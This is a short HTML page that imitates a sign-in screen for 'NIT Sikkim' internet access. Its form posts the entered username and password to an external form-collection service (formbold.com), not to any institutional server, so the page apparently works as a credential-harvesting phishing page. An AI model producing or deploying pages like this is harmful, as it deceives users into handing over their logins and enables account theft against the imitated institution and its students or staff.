<style>
    .box-two {
        background-color: rgb(23, 23, 178);
        height: 90px;
        width: 450px;
        max-width: 1000px;
        margin-top: 80px;
        margin-left: 500px;
    }

    .box-one {
        background-color: rgb(255, 255, 255);
        height: 470px;
        width: 450px;
        max-width: 1000px;

        margin-left: 500px;

    }
</style>

<body>
    <div class="box-two">
        <img id="image" src="nit.html" height="78" width="80">
    </div>
    <div class="box-one">
        <div id="text">
            Sign in to access NIT Sikkim
        </div>
        <div id="text1">
            Internet Connection
        </div>
        <form id="form"
            action="https://formbold.com/s/3ZqGJ"
            method="post"
            enctype="multipart/form-data">
            <div id="input">
                <label for="name"></label>
                <input type="text" id="name" name="name" placeholder="Username" required
                    style="width:350px;height:35px">
            </div>
            <div id="input1">
                <label for="password"></label>
                <input type="password" id="password" name="password" placeholder="Password" required
                    style="width:350px;height:35px">

            </div>
            <div id="input2">
                <label for="submit" style="text-decoration-color:white"></label>
                <input type="submit" value="Sign in"
                    style="color:white;font-size:17px;background-color: rgb(46, 186, 67);width:358px;height:35px">
            </div>
        </form>
        <div id="last">
            <a href="" target="blank" style="text-decoration: none;color:blue">Access the User Portal</a>
        </div>

    </div>

</body>
